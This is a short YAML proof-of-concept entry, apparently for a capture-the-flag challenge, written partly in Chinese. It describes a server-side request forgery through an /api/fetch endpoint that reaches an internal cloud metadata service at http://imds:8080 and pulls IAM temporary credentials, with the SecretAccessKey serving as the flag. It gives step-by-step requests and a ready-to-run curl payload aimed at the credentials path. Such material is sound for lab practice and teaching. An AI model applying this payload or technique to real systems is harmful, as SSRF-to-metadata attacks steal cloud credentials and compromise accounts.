info:
  name: SSRF-IMDS-Credentials
  cve: ''
  summary: 通过SSRF漏洞(/api/fetch)打云实例元数据服务(IMDS)，获取IAM临时凭据中的SecretAccessKey作为flag。关键在于元数据端点非标准169.254.169.254而是http://imds:8080(需从/api/status泄露)。
  severity: medium
  affected: ''
  references: []
poc:
  type: exploit
  principle: 通过SSRF漏洞(/api/fetch)打云实例元数据服务(IMDS)，获取IAM临时凭据中的SecretAccessKey作为flag。关键在于元数据端点非标准169.254.169.254而是http://imds:8080(需从/api/status泄露)。
  steps:
  - 1. GET / 识别 API 入口 (/api/fetch)
  - 2. GET /api/status 发现内部元数据端点 (http://imds:8080)
  - 3. POST /api/fetch SSRF → http://imds:8080/latest/meta-data/
  - 4. POST /api/fetch SSRF → .../iam/security-credentials/ 取角色名
  - 5. POST /api/fetch SSRF → .../iam/security-credentials/<role> 取临时凭据
  - 6. SecretAccessKey 字段即 flag
  payload: 'curl -s -X POST <target>/api/fetch -H "Content-Type: application/json"
    -d ''{"url":"http://imds:8080/latest/meta-data/iam/security-credentials/s3-access-role"}'''
  verification: 通过SSRF漏洞(/api/fetch)打云实例元数据服务(IMDS)，获取IAM临时凭据中的SecretAccessKey作为flag。关键在于元数据端点非标准169.254.169.254而是http://imds:8080(需从/api/status泄露)。
